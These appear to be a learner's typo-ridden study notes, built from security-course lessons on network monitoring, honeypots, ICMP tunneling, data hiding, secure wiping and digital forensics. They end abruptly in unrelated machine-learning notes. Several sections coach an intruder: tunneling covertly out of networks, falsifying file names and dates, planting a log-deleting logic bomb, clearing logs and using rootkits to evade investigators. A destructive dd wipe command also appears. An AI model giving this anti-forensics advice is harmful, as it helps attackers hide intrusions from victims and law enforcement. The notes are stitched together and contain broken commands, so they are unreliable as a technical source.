  To find anomalies on your network when you might be under attack, you'll have
  to know what daily normal network activity looks like. With your network
  operating smoothly, you can baseline your activities. Deviations from this
  baseline mean something is amiss.

  NetworkMiner is a good alternative as wireshark

  Now that you can see network traffic, you have to figure out what it all
  means. Wireshark provides a number of charts that are valuable in
  establishing what normal network traffic looks like. There are a lot of
  different statistics to consult: click on the Statistics field in the menu
  bar at the top of the screen.
  
  These statistics are compilations of data Wireshark observer. Conversations
  and endpoints identify sources of significant amounts of traffuc. This tells
  you what the traffic flow of your network should look like. Some items you
  might consider looking at include ARP or ICMP packets. Large numbers of such
  packets might suggest a problem.

  Basic global statistics are available in the summary window such as:

  - Capture file properties 
  - Capture time
  - Capture filter information
  - Display filter information

  Protocol Hierarchy:

  The protocol hierarchy shows a dissection by OSI layer of the displayed data.
  
  Conversations:
  
  If you use a TCP/IP application or protocol, you should find four active tabs
  for Ethernet, IP, TCP and UDP conversations. A "conversation" represents the
  traffic between two hosts. The number in the tab after the protocol indicate
  the number of conversations, for example "Ethernet:6".

  Ethernet Conversations, IP conversations and TCP conversations.
  
  As you review this information from your computer, which programs might be
  involved in these conversations, iin light of information from the lesson on
  Ports and Protocols?

  The Endpoints provide statiistics about received and transmitted data on a
  per machine basis. The number after the protocol indicates the number of
  endpoints. For instance: "Ethernet:6".
   
   Intrusion Detection Systems:

   You've probably realized that, to use a packet sniffer to detect unauthorized
   activity in real time, you'll have to sit at your computer, watching the
   output of the packet sniffer and desperately hoping to see some kind of
   pattern. An intrusion detection system (IDS) does this job for you. IDSs
   combine the ability to record network activity with sets of rules that allow
   them to flag unauthorized activity and generate real-time warnings.

   Honeypots and Honeynets:

   A honeypot is a computer system or virtual machine that serves no other
   purpose than to lure in hackers. A honeynet is a network of honeypots. In a
   honeypot, there are no authorized users - no real data is stored in the
   system, no real work is performed on it - so, eery access, every attempt to
   use it, can be identified as unauthorized. Instead of sifting through logs to
   identify intrusions, the system administrator knows that every access is an
   intrusion, so a large part of the work is already done.

   Types of Honeypots:

   There are two types of honeypots: production and research.

   Production honeypots are used primarily as warning systems. A production
   honeypot identifies an intrusion and generates an alarm. They can show you
   that an intruder has identified the system or network as an object of
   interest, but not much else. For example, if you wanted to know if bears
   lived near your clearing, you might set out ten tiny pots of honey. If you
   checked them in the morning and found one or more of them empty, then you
   would know that bears had been in the vicinity, but you wouldn't know
   anything else.

   Research honeypots are used to collect information about hacker's activities.
   A research honeypot lures in hackers and then keeps them occupied while it
   quietly record their actions. For example, if - instead of simply documenting
   their presence - you wanted to study the bears then you might set out one
   big, tasty, sticy pot of honey in the middle of your clearing, but then you
   would surround that pot with movie cameras, still cameras, tape recorders and
   research assistants with clipboards and pith helmets.

   The two types of honeypots differ primarily in their complexity. You can more
   easily set up and maintain a production honeypot because of its simplicity
   and the limited amount of information that you hope to collect. In a
   production honeypt, you just want to know that you've been hit; you don't
   care so much whether the hackers stay around. However, in a research
   honeypot, you want the hackers to stay, so that you can see what they are
   doing. This makes setting up and maintaining a research honeypot is is more
   difficult. You must make the system look like a real, working system that
   offers files or services that the hackers find interesting. A bear who knows
   what a honeypot looks like might spend a minute looking at an empty pot, but
   only a full pot full of tasty honey is going to keep the bear hanging around
   long enough for you to study it.

   Honeynets are harder yet; they have to have what appears to be real, live
   traffic on them.

   Building a Honeypot:

   In the most basic sense, a honeypot is nothing more than a computer system
   that is set up with the expectation that it will be compromised by intruders.
   Essentially, this means that if you connect a computer with an insecure
   operating system to the internet, then let it sit there, waiting to be
   compromised, you have created a honeypot. But this isn't a very useful
   honeypot. Its more like leaving your honey out in the clearing, then going
   home to the city. When you come back, the honey will be gone, but you won't
   know anything about who, how, when or why. You don't learn anything from your
   honeypot, unless you have some way of gathering information regarding it. To
   be useful, even the most basic honeypot must have some type of intrusion
   detection system.

   The intrusion detection system could be as simple as a firewall. Normally a
   firewall is used to prevent unauthorized users from accessing a computer
   system, but they also log everything that passes through or is stopped.
   Reviewing the logs produced by the firewall can provide basic information
   about attempts to access the honeypot.

   More complex honeypots might add hardware, such as switches, routers or hubs
   to frther monitor or control network access. They ay also se packet sniffers
   to gather additional information about network traffic.

   Research honeypots may also run programs that simulate normal use, making it
   appear that the honeypot is actually being accessed by authorized users and
   teasing potential intruders with falsified emails, passwords and data. These
   types of programs can also be used to disguise operating systems, making it
   appear, for example, that a Linux based computer is running Windows.

   An improperly configured honeypot can easily be turned into a launching pad
   for additional attacks. If a hacker compromises your honeypot, then promptly
   launches an assault on a large corporation or uses your honeypot to
   distribute a flood of spam, there's a goo change that you will be identifies
   as the one responsible.

   Correctly configured honeypots control network traffic going into and out of
   the computer. A simple production honeypot might allow incoming traffic
   through the firewall, but stop all outgoing traffic. This is a simple,
   effective solution, but intruders will quickly realize it is not a real,
   working computer system. A slightly more complex honeypot might allow some
   outgoing traffic, but not all.

   Research honeypots - which want to keep the intruders interested as long as
   possible - someties use manglers, which audit outgoing traffic and disarm
   potentially dangerois data by modifying it so that it is ineffective.

   www.sicherheitstacho.eu has set up live feeds  of cyber attacks as they
   happen. THe data is based off 180 sensors (honeypots) located around the
   world. The site shows who is attacking who, the amount of data in the attack
   (DDoS), and is updated every few seconds.

   Acrylic WIFI is also a option to analize networks.
   
   When you scan a port, you are really sending a TCP SYN request (Layer 4) to
   see if that port responds. A proper ping uses ICMP, which doesn't use ports.
   Although ICMP rests on top of the Internet Protocol (IP), it is not a layer
   four protocol. This comes in very handy when we get into the firewall and
   network traffic logging.

   Firewalls operate at several levels of the OSI model, restricting or allowing
   data flow based on the criteria that is given. The higher the stack layer,
   the deeper the firewall can inspect the contents of each packet request. At
   the lower layers, the firewall can still intercept and control data movement
   but it doesn't know as uch about the data as it does at the ihgher layers.
   This is where ICMP packets become fun ways to deliver content.

   The technique is known as "ICMP Tunneling." Before we can do much with this
   covert communication, we need some software tools.

   - Wireshark
   - Hping
   
   ICMP packets have plenty of room after the header to store data roughly 41k
   per packer). The idea here is to handcraft ICMP packets loaded with your
   data and send them through a covert ICMP tunnel to the location you want.
   You can generate ICMP packets using hping or nping (from nmap people) and
   insert your payload at the same time. With these ping tools, you can
   customize the Ethernet header, the IP header and the payloads.

   Search for: How ICMP tunnel works?
   
   There are two sides to a tunnel: the sever side and the client side. 

   You would need to get the server-side code onto your target, and run it, for
   this to work. How could you get that code onto a target?.
   
   Once both o these daemons are running host to host, the server will begin
   sniffing for ICMP packets. You will be sending commands through the tunnel to
   the server using ping and the server will respond in turn with ping packets.
   The server daemon will begin collecting your packets and placing the data
   where you have instructed. If the data flow is large, the server will
   establish additional multiple pings. The client side daemon will receive
   transmission updates through the same type of sniffer used on the server.

   With portable drives having ever-higher capacity and smaller sizes,
   physically hiding large amounts of data is straightforward; put the media in
   a safe place away from your house and your computer. 

   before you even think about places to hide your treasure, encrypt the media,
   the data, or both first. Try TrueCrypt.

   If you have small amounts of data, like passwords, private keys, or a secret
   recipe for soup, you can slip that data into places that will not be noticed.
   Don't go so far as trying to hide data in your DNA.

   Malware creators have long known that there is storage space on Window
   systems in the Master Boot Record (MBR). It's not much space but enough to
   hide a private key or a DLL. 

   Swap files are places in media drive that is temporary RAM. The swap file
   space allows the computer to run faster even if it runs out of RAM to execute
   programs. UNIX and Linux set aside a permanent block of media for swap storage. Even if the computer is turned off, this hard drive swap file space can still contain data from previous events.

   Windows swap files (page files) can get quite large and hold pieces of recent
   files. This could be even more dangerous if you were connected to a windows
   based server.

   Windows servers store a significant amount of user data that can be handy to
   the forensic examiner. Take a look at "te p" directories for the swap files.

   Files are stored in clusters. Depending on the operating system, the clusters
   can vary in size. If you created a file on your computer, that file only need
   50% of the cluster's space. This leaves a cluster with open space left. This
   open space within a cluster is called file slack or just slack for short. If
   you delete a file that was in that partial cluster space, that space is still
   available even if the file was deleted.

   The 50% cluster space that was previously occupied with a file, will keep
   that data intact. These data remnants remain in the cluster until it is
   filled with other data. Windows automatically creates slac space as soon as
   any file is created, viewed, odified, or saved.

   Some of the best places to hide data is to hide it in plain sight. File
   modification is just a fancy way of changing the name of a file, altering the
   extension of files, or changing the file attributes. by now, you should
   already know how to change the name of a file.

   You mde a file "Evil Plans" easrlier, now let's get creative. Would you put
   all your passwords in a file and name that file "Passwords?" No, of course
   not. Nor should you pit all of your work files that can be easily identifies.

   When looking to modified files, look at file extensions. File compression is
   an easy say to cover tracks and save space, however, those files will be the
   first one the agents will be checking. So, you will need to alter the file
   extension. This can be accomplished by editing the last three characters of
   the file name.

   Changin a .doc file to a .gid is as simple as changing an .odt file to a
   .avi. Creating the altered files can become tricy and time consuming. Look at
   file sies, created dates, and modified dates to give you ideas of how to
   customize each file. An .odt file should not be a gigabyte in size, as well
   as an .avi file should not be a few kilobytes either.

   An .avi file should be several gigabytes in size.

   Look at the file dates too. The files that were created or accessed within a
   week of the criminal event and after the event should ring a bell in your
   head. Alter those dates to any day at least a year before your hack. If you
   really want to have some fun, change the dates to impossible dates, such as
   30 February or 21 March 2112. 

   Making Data irrecoverable:

   Wash, Rinse, Repeat

   Sanitizing media is inexpensive and provides secure destruction of sensitive
   data. You can eradicate data, wiping those digits off the face of the earth
   using open source software. One of the simplest methods is to encrypt your
   media using True Crypt. Once the entire physical chunk of storage is
   encrypted, it is now somewhat sage to toss that hardware away. The logic is
   that the entire data image cannot be decrypted unless you provide the
   passphrase. Pretty simple, right? If those eighty-give agents get their hands
   on your old media, it is useless to them since you are the only persona who
   can unclock the data. If another person obtains your old media, they will
   have to reformat and repartition it before it can be used.

   There are roughly two standards for proper media destruction. THe first one
   is US DOD 5220.22-M and the other is the Gutmann algorithm. DOD 5220.22 is a
   US National Indultrial Security Program Operating Manualthat provides
   instructoin on destruction of data. The U.S. Department of Defense like to
   destroy things too, so they only authorize complete destructino as a means to
   remove data.

   The Gutmann algorithm, named after Dr. Peter Gutmann and Colin Plumb, gives a
   little more latitude on physical annihilation of hardware. The algorithm
   requires the media to be owerwritten thirty-five times in a manufacture
   specific patter. Different drives require different overwrite patterns.
   ALthough this method is an outstanding researched backed technique, it has
   been outdated due to the size of newer drives and built-in controller
   settings.

   More Software Tools:

   Withing the open source community, there are some great software tools that
   will make your data impossible to recover. THe software will not damage your
   media but will make the data on it unrepairable. When running the software
   you press the "start" button, don't expect to ever see that data again. 

   Boot and Nuke:

   http://www.Dban.org

   Boot and Nuke comes as an ISO image that you brun to a CD and bot your syste
   of it. ONce the software is up and running, you just select which drive you
   want sanitized (nuked). Dban is an industry stanard for bulk data destruction
   and emergency uses. Once Dban has been used on a drive, there is no forensic
   recovery possible.

   Eraser

   Strictly made for Windows, formats and writes several times in a pattern.

   Sderase

   SD is a newcomer to disk wiping. US DOD 5220.22-M mandates that the only
   acceptable method for media and data removal is physical destruction fof the
   media. WE have yet to see any software that can perform physical damage.

   InSSider is also a way of analizing networks.

   Wifi commander es usado en windows para analizar redes.

   In networking there are two types of devices. The first deice is basically a
   "dumb" device, which means that the device doesn't keep a log of activities.
   These devices are common switches, hubs, bridges, and so forth. THey just do
   whatever it is they were designed to do.

   On the other side, we have "intelligent" devices that do keep logs of cerain
   activities and can invoke decisions based on the filters and configuration
   that are installed. THese devices fall into the category of firewalls,
   routers, range extenders, servers, and other network hardware that keeps
   track of data flow. These are the devices that you will need to pay attention
   to because they are the ones that will monitor, record, and possibly disrupt
   your hack. These network roadblocks are covered in depth at other HHS
   lessons.

   You need to know how to deal with these devices to cover your tracks and if
   needed, lead those eight-five agents somewhere else. In your plagging, it
   might help to work backwards on a timelines. This allows you to set the
   amount of time you will be in that network and minimize the changes of you
   being caught by controlling your exposure time.

   You will need to consider multiple ways to properly cover your tracks, before
   you exit the target network. If you just depend on a single method, such as
   erasing all log files, you are leaving yourself open to other tracking
   methods. Erasing log files may sound like a super idea but what happends if
   there are hidden redundant logs? Oopx. We need to choose several courses of
   action that complement each other but do not interfere with your overall
   plans. Consider these points from the perspective of the investigator - and
   that of the perpetrator.

   Planting logic bobs have been used in the past by outsourced vendors who
   haven't been paid, angry admins, and ransom-minded folks. Each of those
   examples place logic bombs where maximun amage to data will occur. ompete
   network data destruction is not a great idea if you want to keep a low
   profile after a network breech.

   A logic bomb that will simply delete or corrupt log files if triggered by an
   audit within so many days (five) or hours after your exit, would work well to
   cover your tracks and not alarm too many people.

   Ccleaner, a free windows based program that has consistently performed well
   for home and commercial users. With this 332KB utility, you can select which
   log files you want to delete or edit on any machine you have admin access to.
   You can even clear your browser history, erasing your own tracks once your
   job is complete. Ccleaner will try to make a system restore point before it
   alters anything. Your two choises are to not allow a restore point or look
   for a file in the root directory labeled "cc_20110928_23232" or something
   like that. Remove and delete that file before leaving, even if that file is
   on your own drive.

   oot kits hide activity and is valuable for Linux-based servers that do not
   have many security holes to use.

   Like any science, digital forensics relies on well-defined methods, which are
   basically concerned with keeping evidence intact. Consider this logic: if
   you've lost control of your evidence, even for a minute, it's not evidence
   any more - it may have been altered.

   Data files can be altered without seeming so. It's easy to change the date,
   check sum, and last access dates after someone has edited a file or a log.
   One of the forensic investigator's duties is to prove that the evidence
   collected has not been altered in any way. Basically, you will need to prove
   that nothing has happened to that data while it was collected, analyzed, in
   custody and at all times.

   This is why it is important to use proven procedures to collect, inspect, and
   handle all data. One simple mistake could render all your hard work
   worthless. This is where a good technique comes into play. By conducting each
   investigator in the same manner and using the same process to document your
   actions, you can prove that nothing has tampered with your evidence.

   Digital Forensic Methodology:

   Digital Forensics is a branch of criminology, so it's all about a procedural
   collection of legally useful evidence. This means that you are only looking
   for evidence that matches the cimre, not poking around just because you can.

   1. Obtain Search Warramt
   2. Evaluate and Secure the scene
   3. Collect the Evidente
   4. Secure the Evidence
   5. Acquire Data
   6. Analyze Data
   7. Assess Evidence and Case
   8. Prepare the Final Report
   9. Testify in the court as an Expert Witness.

   Digital Forensics Process

   When you're investigating a computer crime, you need to base your work on a
   process, such as a policy, procedures, and checklists. Your forensic process
   must be repeatable and hold up to scrutiny by other forensic experts. You
   should develop an investigative process that requires constant documentation
   of everything action that evidence goes through. If it isn't documented, it
   didn't happen.

   An example of this process is:

   1. Identification of evidence (must be documented)
   2. Collection of evidence (Must be documented in Chain of Custody)
   3. Preservation of evidence (Must be documented in Chain of Custody)
   4. Analysis or Interpretation (of course, must be documented)
   5. Communication of your findings and documentation.

   Probably the most critical single document will be the Chain of Custody
   documents, which should state exactly what has been taken as evidence, by
   whom, and who has subsequent custody. Lose custody of your evidence, even for
   a few minutes, and it's probably worthless now.

   www.securitydistro.com
   
   The most common digital forensics/security testing open source or free
   software is in collection of tools such as:

   - Sleuthkit
   - Katana (usb)
   - CAINE
   - DEFT (linux)
   - Helix (e-fence)
   - UNetBootin

   netsh is a nice command to create networks.

   Data Media Analysis:

   Computer forensics investigators use various software tools for analyzing and
   recovering data on various forms of media. There are two basic reasons to
   conduct a forensic analysis: to reconstruct an attack after it occurred, and
   to examine a device that may have been used to carry out a crime.

   The first step before proceeding with any type of data analyze is to make an
   exact image of the evidence and to only work with that image. The software
   tools mentioned earlier allow investigators to perform the following tasks
   and more:

   - Search for text on media devices in file space, slack space, and
     unallocated space.

   - Find and recover data from files that have been deleted or hidden
   
   - Find data in encrypted files

   - Repair FAT (FAT16, FAT32, eFAT) partition tables and boot records

   - Recover data from damaged NTFS partition (Often Linux can do this when Windows
   can't)

   - Joined and split files

   - Analyze and compare files

   - Clone evices that hold data

   - Make data images and backups

   - Erase confidential file securely

   - Efit file using a hex editor (*what is a hex editor?*)

   - Alter file attributes or remove restritive permissions (read or write only)

   Event time is usually crucial, so the offset between the time of the system
   from which evidence has been taken and atomic time should be recorder (don't
   forget the timezone!). Tipically, this is done AFTER evidence has been
   secured since it involves starting the system.
   
   EXIF Data:
   
   Digital photos are encoded with metadata known as EXIF or Exchangeable File
   Image File Format. The original idea of using EXIF was to offer photographers
   precise data on each photo, such as shutter speed, color balance, and time
   and date of the photo. THe amazing array of information includes even more
   additional data if the camera has a GPS activated, including location
   services.

   Most of the cameras that input this tracking data are cellphones. Cell phone
   cameras include in the EXIF, personal data about the users name and if the
   phones GPDD is operating, the EXIF will provide the location where the photo
   was taken.

   Granted, all this information can be spoofed however, few people know about
   this metadata in the first place. One picture posted in social media sight
   can be enough to locate your suspect.

   Imaging Toold:

   Just as with hard disks, any data storage media that could be evidence should
   be imaged and then stored, so your analysis work is only done on the image.
   ou never want to work directly with the original evidence because doing so
   could alter the information on that media. Each of the forensic software
   collections mentioned above can create an exact image of most foms of media.
   If your forensic lab computer can read the media, those software tools can
   image it.

   Use *hashing* techniques to ensure that the binary image is an exact
   bit-for-bit copy of the original. Take a hash of the original. Create the
   image, and then take a hash of the image. If the two hashes are the same, you
   have an identical copy. This should be performed by the same software we
   discussed earlier. It's no use to work on an image that isn't the exact same
   as the original evidence.

   Booting is the process by which a small program actually initializes the
   operating system installed on a computer or on the boting device. Part of
   this process involves looking into the boot sector to find out where the
   operating system is. USB drives can become a boot device as can CD/DVD, ZIP
   drives, flash media cards, and network interface card (using PXE).

   A "live" CD/DVD/USB or other media means the device can boot up the computer.
   As long as the computer BIOS allows or booting from other media, this
   bootable media can load all sorts of operating systems including virtual
   machines and dual booting.

   The ability to boot from several types of media can allow a suspect to boot a
   computer with their own operating system and store all their evidence on that
   same device. This form of boot-up would not leave any trace of activity on
   the suspect's computer and would make your job all that much more difficult.

   Deleted ata:

   A killer usually wants to get rid of the dead body and the weapong they used
   as quickly as possible after the crime. The killer wants to destroy any
   evidente that would link them to the murder. A computer crime suspect will
   want to do the exact same thing. Digital evidence can be removed easier and
   quicker if the suspect knows what they are doing. To delete traces of old
   files, Linux uses the command dd.

   dd if=/dev/zero of=/home/filename

   synch (sync)

   rm /home/filename

   sych

   To delete files and remove traces of those files in Windows:

   1. Using Explorer, select the files or flders and hit the "delete" key.

   2. Clear all files in Temp directory or use software like CCleaner.
 
   3. Once the files are deleted, select the Recycle Bin.

   4. Right click on the Recycle Bin and select "Empty Recycle Bin."

   5. Create a new Restore Point under "Systems" and delete the older Restore
      Points.

   6. Reboot.

   Ccleaner lets you select which log files you want to delete or edit on any
   achine you have admin access to. A suspect can even clear their browser
   history, erasing their own tracks once their job is complete. Ccleaner will
   try to make a system restore point before it alters anything. Your two
   choises are to not allow a restore point or look for a file in the root
   directory labeled "cc_20110928_203957" or something like that. A suspect will
   remove and delete that file before leaving, even i that file is on a portable
   drive.

   Formatting Media:

   Most media needs to be formatted before it can be used for a particular
   operating system. As a rule of thumb, formatting destroys all data that was
   previosly on that media. If you come accross a hard drive or other media that
   was recently formatted. It may contain evidence that the suspect wants to
   remove. With the software tools listed earlier, you have the capabilities to
   recover files and folder from that media.

   There are programs out there that will format the media, write random
   information on the new formatteddrive, reformat and continues this process as
   many times as you wish. Under these extreme conditions, recoverint the
   original files and folders will be quite difficult. *The key to recovering
   anything is to identify this event and media as quickly as possible*.

   Precautions While Collectin Evidence from a Data Storage Device:

   There are the rules for when you're on the opposite side: when it comes to
   collecting media for forensic examination. You will not need a hammer or a
   drill. In this situation, you will need to be careful and non-destructive.

   - Hold the media only by outer edges and avoid scratches or dropping it.

   - Use water-based markers for writing on evidence.

   - Place digital evidence devices in a waterproof and labeled bag.

   - Take special precautions with storage media that are cracked or damaged.

   - Do not rinse media with water to remove surface dirt, possible drug
     contamination, grase, an/or oils.

   - Do not use any type of cleaner based on organic or petroleum solvents near
     the evidence.

   - Create an image of the date on the media and work with the image to prevent
     damage to the original data.

   Steganography A look at security controversy

   The topic of steganography ives you a change to look at how differently
   security experts can think. It is a totally workable means to secretly
   transfer data; it's just never been found in the wild. Is anybody using this
   stuff?.

   When you're performing digital forensic investigatins, it is not enough to
   simply recover photos, documents, videos, audio and VoIP packet data
   contained on the suspect media without also testing that evidence for
   potential hidden evidence such as steganogaphy. While it may appear to be a
   benign picture, that picture may contain a plethora of hidden information.

   Steganography, often referred to as stego, is the ability to hide information
   within transmissions without ayone being able to notice any change or
   modification to the original host without the use of special software tools.
   For example, a picture containing a hidden stego message looks identical to
   the casual viewer and gives no obvious indications that any modifications
   have been made to the original. While similar to encryption in that stego is
   used to hide objects and data, making it unnoticeable and unreadable, stego
   but should not be confused with cryptography. Steganography embeds the
   information in such things as documents or images while cryptography encrypts
   the information using a cypher or encryption key that is used to scramble and
   later unscramble the message.

   In a recent case, stego was used, and detected by the FBI. Ten stego
   criminals were then released to Russia s part of a modern day spy swap. 

   Steganography uses many different techniques from data insertion to
   algorightmic but to make the concept easier to understand, let's just say
   that steganography inserts data into a host file in a manner that does not
   readily change the host file that can be distributed to other persons who can
   then reconstruct the hidden message(s) contained in that host file. While
   graphics, bitmap images in particular are the most used steganography hosts,
   the host can be audio files, videos, or documents as well.

   There are more than 600 known stego creation detection tools available on the
   internet. But even with all the tools, a person who is trained to use a hex
   editor can readily detect steganography "infected" hosts if they have access
   to a library of clean original images, documents, videos and audio files with
   which to compare the suspect hosts against. Steganography detection is also
   aided with the usage of Steganography signature libraries similar to
   anti-virus definition detection as well as the comparison of steganography
   based hash values. Steganography hash values are available at sites such as
   http://www.hashkeeper.org or http://www.stegoarchive.com

   A few examples of common steganography creation tools include S-Toolsv4, JP
   Hide-and-Seek, JStegShell, ImageHide, ES Stego and Dounds Stegonagraphy.

   Whereas StegDetect and Stegbreak are tools used to help detect steganography
   infected hosts. 

   http://Stegano.net

   Read: Dound's Steganography

   Windows Forensics:

   Windows is constantly moving files aorund and modifying them, even the ones
   you are looking for.

   DNS in wireshark shows what pages were navigated.
   
   We'll start this messy affair by covering the different types of volatile and
   non volatile information an investigator can collect from a Windows system.
   This section goes into more details about grabbing and analyzing data in
   memory, the registry, events, and files.

   Volatile Information:

   Information that is lost when a system is powered down or otherwise loses
   power. Volatile information exist in physical memory or RAM, and consists of
   information about processes, network connections, open files, clipboard
   contents, etc. This information describes the state of the system at a
   particular point in time.

   When performing a live analysis of a computer, one of the first things
   investigators should collect is the content of RAM. By collecting the
   contents of RAM first, investigators minimize the impact of their data
   collection activity on the contents of RAM.

   These are some of the specific types of volatile information that
   investigator should collect:

   - System time
   - Open files
   - Logged-on user(s)
   - Network Connections  
   - Process information
   - Process-to-port mapping
   - Process memory
   - Network status
   - Clipboard contents
   - Service/driver information
   - Command history
   - Mapped drives, shares

   Tools for Collecting Volatile Information On Windows:

   To collect volatile information from a Windows system, you could use the
   following free software tools, which belong to the Sysinternals suite provded
   by Microsoft, you can ownload it for free.

   After downloading it, you should install it on the root (C:\) of your
   dforensic workstation hard disk. You'll use these commands (unsurprisingly)
   in the command line interface, like this:

   psloggedon

   This sysinternals program enables you to see who is logged on the system
   locally as well as those users who are logged on remotely.

   time /t command

   Use this command to see the system actual time. Windows shows file time in
   UTC which is also GMT (Universal Time). The file time is shown down to the
   100th nanosecond in a hexadecimal 8 bit format. Windows system time is shown
   in 32 bit, displaying month, day, year, weekday, hour, minute, second and
   millisecond.

   net session

   This command shows not only the names of the users accessing the system via a
   remote logon session but also the IP address and the types of client from
   which they are accessing the system.

   openfiles

   This command lists user logged in to a system remotely; investigators should
   also see what files they have open; if any. This command is used to list or
   disconnect all files and folders that are open on a system.

   psfile

   This program also belongs to the Sysinternals suite discussed above. It's a
   command line program that shows a list of files on a system that are open
   remotely. It allows a user to close open files either by name or by file
   identifier.

   net file

   This command display the names of all open shared files on a system and the
   number of files locks, and closes individual shared files and removes file
   locks.

   You might want to look for deleted files is in the thumbs preview database
   for windows. Look for a file listed as thumbs.db_. This will show you all the
   thumbnail images of files viewer in explorer as thumbnails.

   Non-volatile Information:

   Non-volatile information is kept on asecondary storage devices and persists
   after a system is powered down. It's not perishable and can be collecte after
   the volatile information is collecte. The following are some of the specifit
   type of non-volatile information that investigators should collect:

   - Hidden files
   - Slack space
   - Swap files
   - Index.dat files
   - Meta Data
   - Hidden ADS (Alternate Data Streams)
   - Windows Search Index
   - Unallocated clusters
   - Unused partitions
   - Registry settings
   - Connected devices
   - Event logs

   Anytime an object (A file) is acted upon by another object (an intruder),
   there will be residual effects. The effects might not be easy to locate or
   detect, but those actions (of deleting or modifying) will cause some other
   results elsewhere. To reduce detectable actions, a professional hacker will
   use the tools that are already built into the system. They won't introduce
   new software, instead they will use the system tools in a manner that seems
   normal.

   Linux Slack

   Linux file systems do contain slack space, just as Windows does. The slack
   space is mch smaller, roughly 4K per block. This means that a suspect can
   ohide about 4KB of data in a small file block. The same techniques we
   discussed in Windows slack space can be applied to Linux slack space. This
   space is undetectable by filesystem and disk usage tools. Then data is
   removed or deleted, the slack space will remain wth the contents of any
   hidden data.

   Silly String

   Text strings in Linux are fairly easy to search for and locate using the
   command:

   /dev/hdaX | grep 'text ou want to look for'

   Depending on the size of the media, this search can take quite a while
   because it will look for that text everywhere in that partition. You will not
   want to use a hex editor, since this will take even longer to perform. A hex
   editor can be useful to determine the contents of that media, though.

   Grep

   Grep is an immensely powerful Linux tool. It is used to find certain lines
   within a file. This allows you to quickly find files that contain certain
   things within a directory or file system. It also allows for searching on
   regular expressions. There are search patterns that allow you to specify
   criteria that search much match. For example: finding all strings in the
   dictionary that start with "s" and finish with "t" to help with doing a
   crossword.

   grep ^s.*t$ /usr/share/dict/words

   More Command-line Tools:

   THe "Live" forensic tools we discussed earlier are complete Linux forensic
   toolkits. Linux itself has a number of simple utilities for imaging and basic
   disk analysis, including the following:

   dd: The dd command can copy data from any disk that Linux can mount and
   access.

   This command can make a bit-stream disk-to-disk file, disk-to-image file,
   block-to-block copy/block-to-file copy.

   sfdisk and fdisk: Displays the disk structure.

   grep: Searches files for instances of an expression or pattern.

   md5sum and sha1sum: Creates and stores an MD5 or SHA-1 hash of a file or list
   of files (including devices).

   file: Read file header information to tell its type, regardless of name or
   extension.

   xxd: A command-line hex dump tool

   ghex and khexedit: GNome and KDE hex editors

  Finding a Haystack in a Needle:

  Open source forensic software includes powerful search tools that let you
  search for many combinations and permutations of factors for deep data
  searching. THere is no need to buy expensive commercial tools, which is the
  wonderful part of using Open Source Software. Linux provides you with plenty
  of scope to construct similar tools using standard utilities. The following
  text details the use of find, grep and string, and then describes the use of
  the pipe to combine them.

  Encryption, Decryption and File Formats

  Many of the files that you will come across will not be immediately readable.
  Most programs have their own propietary file formats, while others use
  standard formats - for example the standatd picture formats - gid, jpg, png,
  etc. Linux provides an excellent utility to help you to determine what a given
  file is. Remember the file command from above?

  Command Line Switch - Effect

  -k                    Don't stop at the first match, keep going
   
  -L                    Follow symbolic Links

  -z                    Attempt to look inside compressed files

  These switches let you try to read a file. THere are a number of file
  conversion utilities available to you under linux, and even more available on
  the internet, as well as a number of file viewers for various formats.
  Sometimes it may require more than one step to get to a place where you can
  really work with data - try to think laterally!.

  Occasionally, you will cme across files which have been encrypted or password
  protected. The complicatoin that this presents varies, from encryption that is
  easily broken to stuff that would even give the best decryption professionals
  a headache. It pays to examine the area surrounding the computer that you are
  dealing with. People aren't very good at remembering passwords; they may well
  be written down somewhere nearby.

  Common choises for passwords also involve: pets, relatives, dates, telephone
  numbers, car registrations, and other simple combinations. People are also
  reluctant to use more than one or two passwords for everything, so if you can
  reverse engineer a password on one file or application, try it on the others.
  It is highly likely to be the same. 

  Examples of Digital Forensics at Work:

  Based on the DNS of a network, one can know what the ISP is
  
  Morgan Stanley: In a FLorida court case, Morgan Stanley repeatedly failed to
  turn over data related to a fraud suit against them. 1423 backup tapes were
  conecaled by MS that contained emails detailing the fraud. A fired MS
  technician revealed to the court that those tapes existed and many other tapes
  were deliberatly mislabeled. Forensic examination confirmed this intentional
  fraud. 

  David Kernell: The defendant hacked into Sarah Palin's Yahoo email account.
  Before the FBI arrived to investigate this crime, Kernell uninstalled his web
  browser and fragmented his hard drive. The government was able to provide
  sufficient forensic and testimonial evidence of his crime to convict him on a
  number of counts.

  Albers Gonzalez: ONe of the longest convictions ever handed down for acomputer
  crime was convicted of stealing 90 million credit card and debit card numbers.
  The defendant ran a gang of cyber-thieves over several years and bought a
  yacht for himself using the stolen money. Teams of digital forensic examiners
  were called in to crack the case and provide evidence.

  The router is the default gateway by default, lol.

  Mobile Forensics:

  Using mobile communications as a tool in your planning and/or execution of the
  hack can provide you with a completely new set of options. Cell phones use
  several forms of signaling, one is the radio that links your phone to the
  closest antenna receiver, the next is the Bluetooth link that works for
  short-range connections, the GPS signal locator can be used for other
  funciotions, and lastly the phone has digital connection capabilities. We want
  to focus on the digital portion of a cellphone.

  Inside a cell phone is a Subscriber Identification Module (SIM) card that
  identifies your phone to you and your service provider. This SIM card is also
  the same card that stores some of your phone numbers and other text data. This
  card has an onboard microprocessor.

  SIM cards contain a special set of numbers known as International Mobile
  Subscriber Identity (IMSI). The IMSI is the phone number for that device and
  can be thought of as a Machine 

  What is Clustering?:

  In machine learning, we often group examples as a first step to understand a
  subject (Data set) in a machine learning system. Grouping unlabeled examples
  is called clustering.

  An unlabeled example is an example that contains feature sbut no label.
  Unlabeled examples are the input to inference. In semi-supervised and
  unsupervised learning, unlabeled examples are used during training.

  A feature is an input variable used in making predictions

  Predictions are A mode'ls output when provided with an input example.

  An example is one row of a dataset. An example contains one or more features
  and possibly a labe.lwhat is a dataset

  A dataset is a collection of data.

  In machine learning, inference often refers to the process of making
  predictions by aplying the trained model to unlabeled examples. In statustics,
  inference refers to the process of fitting the parameters of a distribution
  conditioned on some observed data.

  As the examples are unlabeled, clustering relies on unsupervised machine
  learning. If the examples are labeled, then clustering becomes classification.

  What are the Uses of Clustering?
  Clustering has a myriad of uses in a variety of industries. Some common
  applications for clustering include the following:

  - Market segmentation

  - Social network analysis

  - Search result grouping

  - Medical imaging

  - Image segmentation

  - Anomaly detection

  After clustering, each cluster is assigned a number called a cluster ID. Now,
  you can condense the entire feature set for an example into its cluster ID:
  Representing a complex example by a simple custer ID makes clustering
  powerful. Extending the idea, custering dara can simplify large datasets.

  Fr example, you can group items by differete features as destrated i the
